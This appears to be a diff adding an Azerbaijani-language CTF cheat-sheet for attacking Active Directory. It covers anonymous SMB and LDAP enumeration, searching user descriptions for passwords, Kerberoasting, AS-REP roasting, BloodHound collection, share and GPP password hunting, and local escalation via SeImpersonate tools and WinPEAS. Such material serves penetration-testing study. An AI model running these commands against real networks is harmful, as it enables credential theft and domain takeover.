@@ -1,0 +1,107 @@
+netexec smb <Hədəf_IP> -u '' -p '' --users
+rpcclient -U "" -N <Hədəf_IP>
+netexec smb <Hədəf_IP> -u '' -p '' --shares
+ldapsearch -x -H ldap://<Hədəf_IP> -b "dc=domain,dc=local"
+ldapsearch -x -H ldap://<Hədəf_IP> -b "dc=domain,dc=local" "(description=*pass*)" description
+netexec smb <Hədəf_IP> -u 'tapılan_user' -p 'tapılan_şifrə'
+ldapsearch -x -H ldap://<Hədəf_IP> -s base namingContexts
+ldapsearch -x -H ldap://<Hədəf_IP> -b "dc=imtahan,dc=local" "(objectClass=user)" sAMAccountName description
+ldapsearch -x -H ldap://<Hədəf_IP> -b "dc=imtahan,dc=local" "(&(objectClass=user)(description=*))" sAMAccountName description
+ldapsearch -x -H ldap://<Hədəf_IP> -b "dc=imtahan,dc=local" "(objectClass=user)" sAMAccountName description | grep -E "sAMAccountName|description"
+evil-winrm -i <Hədəf_IP> -u 'admin_backup' -p 'P@ssword123!'
+
+
+
+Active Directory (AD) mühitində sıravi istifadəçi hüquqlarından ən yüksək səviyyəli hüquqa — yəni Windows terminologiyası ilə **Domain Admin** (və ya bəzən yerəl maşında Administrator/SYSTEM) statusuna — yüksəlmək üçün növbəti mərhələ yetkilərin artırılması (**Privilege Escalation**) mərhələsidir.
+
+CTF imtahanlarında ilkin istifadəçi məlumatları (credentials) əldə edildikdən sonra yüksək hüquqlar qazanmaq üçün ən çox istifadə olunan və yoxlanılması vacib olan klassik AD hücum metodları bunlardır:
+
+---
+
+### 1. Kerberoasting (Sıravi İstifadəçi Hüququ ilə)
+
+Əgər əlinizdə hər hansı bir valid (düzgün) istifadəçi məlumatı varsa, sistemdəki Service Principal Name (SPN) qeydiyyatı olan xidmət hesablarının Kerberos biletlərini (TGS) istəyə bilərsiniz. Bu biletlər şifrələnmiş olur və onları lokal mühitdə sındırmaq (crack etmək) mümkündür.
+
+* **`NetExec` ilə Kerberoasting yoxlamaq:**
+```bash
+netexec smb <Hədəf_IP> -u 'istifadəçi' -p 'şifrə' --kerberoasting output.txt
+
+```
+
+
+* **`Impacket` (`GetUserSPNs.py`) ilə biletləri çəkmək:**
+```bash
+GetUserSPNs.py -dc-ip <Hədəf_IP> domen.local/istifadəçi:şifrə -request -outputfile hashes.txt
+
+```
+
+
+*Əgər buradan bir hash əldə etsəniz, onu `john` və ya `hashcat` aləti ilə sındıraraq həmin xidmət hesabının şifrəsini tapa bilərsiniz. Bu hesablar çox vaxt yüksək imtiyazlara sahib olur.*
+
+---
+
+### 2. BloodHound ilə Hücum Yollarının Analizi
+
+Active Directory daxilində hüquqların yüksəldilməsi yollarını vizual olaraq görmək üçün ən effektiv üsul BloodHound alətidir. O, istifadəçilər, qruplar və maşınlar arasındakı əlaqələri analiz edir.
+
+* **Məlumatların toplanması (`bloodhound-python` ilə):**
+```bash
+bloodhound-python -u 'istifadəçi' -p 'şifrə' -d domen.local -dc domen-controller-adı.domen.local -c All
+
+```
+
+
+*Bu əmr nəticəsində bir neçə `.json` faylı yaranacaq. Bu faylları BloodHound interfeysinə yükləyərək "Shortest Paths to High Privileged Groups" (Yüksək imtiyazlı qruplara gedən ən qısa yollar) sorğusunu işlədib hansı istifadəçinin hara icazəsi olduğunu vizual görə bilərsiniz.*
+
+---
+
+### 3. AS-REP Roasting (Şifrəsiz İstifadəçilər)
+
+Bəzi istifadəçi hesablarında "Do not require Kerberos preauthentication" (Kerberos ilkin autentifikasiyası tələb olunmasın) konfiqurasiyası aktiv olur. Bu zaman həmin istifadəçilərin şifrə hash-lərini heç bir şifrə bilmədən birbaşa çəkmək olar.
+
+* **`Impacket` (`GetNPUsers.py`) ilə yoxlamaq:**
+```bash
+GetNPUsers.py domen.local/ -dc-ip <Hədəf_IP> -no-pass -usersfile users.txt
+
+```
+
+
+*(Buradakı `users.txt` əvvəlki mərhələdə `ldapsearch` və ya `netexec` ilə tapdığınız istifadəçi adlarının siyahısıdır).*
+
+---
+
+### 4. Şəbəkə Paylaşımlarında (Shares) Şifrə Axtarışı
+
+Bəzən daxili şəbəkədə hamıya açıq paylaşılan qovluqlarda (məsələn, `SYSVOL` qovluğunda və ya skript arxivlərində) administrator şifrələri unudulur (məsələn, Group Policy Preferences - GPP boşluğu).
+
+* **Paylaşılan qovluqların içində axtarış:**
+```bash
+netexec smb <Hədəf_IP> -u 'istifadəçi' -p 'şifrə' --shares
+
+```
+
+
+Əgər yazma/oxuma icazəniz olan maraqlı qovluqlar (məsələn, `Backup`, `Scripts`, `SYSVOL`) varsa, `smbclient` ilə daxil olub konfiqurasiya fayllarını yoxlaya bilərsiniz:
+```bash
+smbclient //<Hədəf_IP>/qovluq_adı -U 'istifadəçi'
+
+```
+
+
+
+---
+
+### 5. Yerəl Maşında Hüquqların Artırılması (Lokal Privilege Escalation)
+
+Əgər tapdığınız istifadəçi ilə `Evil-WinRM` və ya SSH vasitəsilə sistemə daxil ola bilmisinizsə, həmin lokal maşında Administrator (SYSTEM) olmaq üçün aşağıdakıları yoxlayın:
+
+* **İstifadəçinin privileges (imtiyazlarını) yoxlamaq:**
+```cmd
+whoami /priv
+
+```
+
+
+*Əgər nəticədə `SeImpersonatePrivilege`, `SeBackupPrivilege` və ya `SeTakeOwnershipPrivilege` görsəniz, bu imtiyazlardan istifadə edərək sistemi asanlıqla `SYSTEM` hüququna qaldıra bilərsiniz (məsələn, `SeImpersonate` üçün `PrintSpoofer` və ya `GodPotato` alətləri istifadə olunur).*
+* **Avtomatlaşdırılmış skriptlər işlətmək:**
+Sistemə daxil olduqdan sonra `WinPEAS.exe` skriptini hədəf maşına yükləyib işlədərək, sistemdəki zəif konfiqurasiyaları (məsələn, unquoted service paths, unencrypted passwords) avtomatik aşkar edə bilərsiniz.
